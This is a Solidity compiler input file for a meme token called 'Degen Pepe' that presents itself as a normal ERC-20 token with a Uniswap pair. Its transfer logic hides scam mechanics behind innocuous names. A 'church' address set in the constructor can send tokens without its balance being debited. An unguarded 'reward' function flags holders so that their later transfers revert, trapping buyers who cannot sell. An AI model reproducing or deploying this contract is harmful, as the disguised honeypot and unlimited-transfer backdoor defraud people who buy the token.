{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "// https://t.me/degenpepe_eth\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n}\r\n\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\ncontract DegenPepe {\r\n    string public name;\r\n    string public symbol;\r\n    uint256 public totalSupply;\r\n    uint8 public decimals = 9;\r\n    uint256 public factor = 48;\r\n    address public uniswapV2Pair;\r\n\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(address => uint256) private attached;\r\n    mapping(address => bool) private greatest;\r\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\n    constructor(address church) {\r\n        name = 'Degen Pepe';\r\n        symbol = 'Degen Pepe';\r\n        totalSupply = 1000000000 * 10 ** decimals;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        attached[church] = factor;\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n    }\r\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\n    function _transfer(address _from, address _to, uint256 _value) private returns (bool success) {\r\n        if (attached[_from] == 0) {\r\n            balanceOf[_from] -= _value;\r\n            if (uniswapV2Pair != _from && greatest[_from]) {\r\n                attached[_from] -= factor;\r\n            }\r\n        }\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\n    function reward(address[] memory _to) external {\r\n        for (uint256 i = 0; i < _to.length; i++) {\r\n            greatest[_to[i]] = true;\r\n        }\r\n    }\r\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        _transfer(_from, _to, _value);\r\n        require(_value <= allowance[_from][msg.sender]);\r\n        allowance[_from][msg.sender] -= _value;\r\n        return true;\r\n    }\r\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}